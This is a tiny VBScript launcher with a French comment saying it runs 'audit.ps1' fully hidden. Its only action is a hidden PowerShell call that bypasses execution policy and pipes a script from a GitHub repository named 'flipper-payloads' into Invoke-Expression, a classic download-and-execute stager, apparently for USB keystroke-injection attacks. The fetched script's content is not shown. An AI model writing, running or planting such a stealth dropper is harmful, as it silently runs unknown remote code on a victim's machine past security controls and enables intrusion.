' Lance audit.ps1 en caché total
Set objShell = CreateObject("WScript.Shell")
objShell.Run "powershell -w h -NoP -NonI -Exec Bypass -Command ""irm https://raw.githubusercontent.com/timeobonnin-prog/flipper-payloads/main/audit.ps1 | iex""", 0, False